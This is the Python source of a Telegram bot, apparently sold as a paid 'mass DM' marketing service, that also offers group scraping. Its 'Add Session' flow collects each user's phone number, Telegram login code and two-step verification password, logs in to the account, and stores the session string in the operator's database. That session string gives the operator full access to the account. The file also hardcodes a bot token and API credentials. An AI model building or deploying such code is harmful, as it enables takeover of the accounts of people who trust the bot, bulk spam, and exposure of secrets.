import os
import sqlite3
import threading
from flask import Flask
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from telethon.sessions import StringSession
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    ApplicationBuilder,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

API_ID = 36645562
API_HASH = "ccad405579d80b82492abbf4a7777907"


# --- Database Setup ---
def init_db():
  conn = sqlite3.connect("bot_database.db")
  cursor = conn.cursor()
  cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            first_name TEXT,
            tier TEXT DEFAULT 'Free Trial',
            dms_left INTEGER DEFAULT 200,
            active_sessions INTEGER DEFAULT 0,
            total_sent INTEGER DEFAULT 0
        )
    """)
  cursor.execute("""
        CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            phone_number TEXT,
            session_string TEXT
        )
    """)
  conn.commit()
  conn.close()


init_db()


def get_or_create_user(user_id, first_name):
  conn = sqlite3.connect("bot_database.db")
  cursor = conn.cursor()
  cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
  user = cursor.fetchone()
  if not user:
    cursor.execute(
        "INSERT INTO users (user_id, first_name) VALUES (?, ?)",
        (user_id, first_name),
    )
    conn.commit()
    cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    user = cursor.fetchone()
  conn.close()
  return user


def count_user_sessions(user_id):
  conn = sqlite3.connect("bot_database.db")
  cursor = conn.cursor()
  cursor.execute(
      "SELECT COUNT(*) FROM sessions WHERE user_id = ?", (user_id,)
  )
  count = cursor.fetchone()[0]
  conn.close()
  return count


# --- Flask Server ---
app_web = Flask(__name__)


@app_web.route("/")
def home():
  return "Bot is active and running!"


def run_flask():
  port = int(os.environ.get("PORT", 5000))
  app_web.run(host="0.0.0.0", port=port, use_reloader=False)


# --- Telegram Bot Code ---
TOKEN = "8627528321:AAFSSdgHID0Mizwhx5hxulhIa-CErWR5Yu0"
user_states = {}
temp_data = {}


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
  user = update.effective_user
  get_or_create_user(user.id, user.first_name)

  keyboard = [
      [
          InlineKeyboardButton(
              "🚀 START MASS DM CAMPAIGN", callback_data="start_campaign"
          )
      ],
      [
          InlineKeyboardButton(
              "⚡ FAST Auto-Forward DM", callback_data="fast_forward"
          )
      ],
      [
          InlineKeyboardButton("🔍 Scrape Group", callback_data="scrape_group"),
          InlineKeyboardButton("🎁 Invite & Earn", callback_data="invite_earn"),
      ],
      [
          InlineKeyboardButton("💎 VIP Premium", callback_data="vip_premium"),
          InlineKeyboardButton("👤 My Account", callback_data="my_account"),
      ],
      [
          InlineKeyboardButton("➕ Add Session", callback_data="add_session"),
          InlineKeyboardButton(
              "❌ Remove Session", callback_data="remove_session"
          ),
      ],
      [InlineKeyboardButton("📖 Tutorial & Terms", callback_data="tutorial")],
      [InlineKeyboardButton("💬 Contact Support", callback_data="support")],
  ]
  reply_markup = InlineKeyboardMarkup(keyboard)

  welcome_text = (
      f"🤖 Automatic DMs Bot\n"
      f"💎 Premium Mass DM & Marketing Automation\n\n"
      f"Welcome to the most advanced and secure Telegram automation engine. Maximize"
      f" your outreach with zero ban risk, utilizing our high-speed smart"
      f" nodes.\n\n"
      f"👤 User Profile: {user.first_name}\n"
      f"🆔 Account ID: {user.id}\n"
      f"🟢 Server Node: 🟩 100% Online\n\n"
      f"📢 Expand your audience security!\n"
      f"🎁 Claim your 200 Free DMs trial today.\n\n"
      f"Developed by - @SHUBHxSELLER"
  )
  await update.message.reply_text(welcome_text, reply_markup=reply_markup)


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
  query = update.callback_query
  await query.answer()
  data = query.data
  user_id = query.from_user.id
  first_name = query.from_user.first_name

  if data == "start_campaign":
    await query.message.reply_text(
        "🚀 Mass DM Control Panel\n\nPlease ensure you have added a session"
        " first using Add Session."
    )
  elif data == "add_session":
    user_states[user_id] = "waiting_for_phone"
    await query.message.reply_text(
        "🔑 OTP Session Generator\n\nPlease enter your Telegram Phone Number with"
        " country code.\nExample: +919876543210"
    )
  elif data == "my_account":
    db_user = get_or_create_user(user_id, first_name)
    actual_sessions = count_user_sessions(user_id)
    account_text = (
        f"👤 Account Profile Details:\n\n"
        f"• Name: {db_user[1]}\n"
        f"• ID: {db_user[0]}\n"
        f"• Subscription Tier: {db_user[2]}\n"
        f"• Free DMs Left: {db_user[3]}\n"
        f"• Active Sessions: {actual_sessions}\n"
        f"• Total DMs Sent: {db_user[5]}"
    )
    await query.message.reply_text(account_text)
  elif data == "vip_premium":
    await query.message.reply_text(
        "💎 VIP Subscription Plans\n\n1 Day: ₹25\n3 Days: ₹60\n7 Days:"
        " ₹120\n1 Month: ₹350\n\nContact admin to upgrade."
    )
  elif data == "support":
    await query.message.reply_text(
        "🛠️ For support and purchase, contact: @SHUBHxSELLER"
    )
  else:
    await query.message.reply_text(f"⚙️ Feature {data} is under configuration.")


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
  user_id = update.effective_user.id
  text = update.message.text.strip()
  state = user_states.get(user_id)

  if state == "waiting_for_phone":
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    try:
      await client.connect()
      sent = await client.send_code_request(text)
      temp_data[user_id] = {
          "client": client,
          "phone": text,
          "phone_code_hash": sent.phone_code_hash,
      }
      user_states[user_id] = "waiting_for_otp"
      await update.message.reply_text(
          f"✅ OTP sent successfully to {text}!\n\nPlease check your official"
          " Telegram app and enter the OTP code here:"
      )
    except Exception as e:
      await client.disconnect()
      user_states[user_id] = None
      await update.message.reply_text(
          f"❌ Error sending OTP: {str(e)}\nPlease try again."
      )

  elif state == "waiting_for_otp":
    data = temp_data.get(user_id)
    if not data:
      user_states[user_id] = None
      await update.message.reply_text(
          "Session expired. Please click 'Add Session' again."
      )
      return

    client = data["client"]
    phone = data["phone"]
    phone_code_hash = data["phone_code_hash"]

    try:
      await client.sign_in(phone=phone, code=text, phone_code_hash=phone_code_hash)

      session_string = client.session.save()
      await client.disconnect()

      conn = sqlite3.connect("bot_database.db")
      cursor = conn.cursor()
      cursor.execute(
          "INSERT INTO sessions (user_id, phone_number, session_string) VALUES"
          " (?, ?, ?)",
          (user_id, phone, session_string),
      )
      cursor.execute(
          "UPDATE users SET active_sessions = active_sessions + 1 WHERE user_id"
          " = ?",
          (user_id,),
      )
      conn.commit()
      conn.close()

      user_states[user_id] = None
      del temp_data[user_id]

      await update.message.reply_text(
          f"🎉 Success! Account {phone} has been successfully connected!"
      )

    except SessionPasswordNeededError:
      user_states[user_id] = "waiting_for_2fa"
      await update.message.reply_text(
          "🔒 Aapke account par Two-Step Verification (2FA) password on hai."
          " Kripya apna 2FA password yahan bhejein:"
      )
    except Exception as e:
      await update.message.reply_text(
          f"❌ Invalid OTP error: {str(e)}\nKripya sahi OTP dobara bhejein:"
      )

  elif state == "waiting_for_2fa":
    data = temp_data.get(user_id)
    if not data:
      user_states[user_id] = None
      await update.message.reply_text(
          "Session expired. Please click 'Add Session' again."
      )
      return

    client = data["client"]
    phone = data["phone"]

    try:
      await client.sign_in(password=text)
      session_string = client.session.save()
      await client.disconnect()

      conn = sqlite3.connect("bot_database.db")
      cursor = conn.cursor()
      cursor.execute(
          "INSERT INTO sessions (user_id, phone_number, session_string) VALUES"
          " (?, ?, ?)",
          (user_id, phone, session_string),
      )
      cursor.execute(
          "UPDATE users SET active_sessions = active_sessions + 1 WHERE user_id"
          " = ?",
          (user_id,),
      )
      conn.commit()
      conn.close()

      user_states[user_id] = None
      del temp_data[user_id]

      await update.message.reply_text(
          f"🎉 Success! Account {phone} (with 2FA) connected successfully!"
      )
    except Exception as e:
      await update.message.reply_text(
          f"❌ Galat Password: {str(e)}\nKripya sahi 2FA password dobara bhejein:"
      )

  else:
    await update.message.reply_text(
        "Please use the menu buttons or send /start."
    )


if __name__ == "__main__":
  flask_thread = threading.Thread(target=run_flask, daemon=True)
  flask_thread.start()

  app = ApplicationBuilder().token(TOKEN).build()
  app.add_handler(CommandHandler("start", start))
  app.add_handler(CallbackQueryHandler(button_handler))
  app.add_handler(
      MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message)
  )

  print("Telethon 2FA Supported OTP Bot is running...")
  app.run_polling()
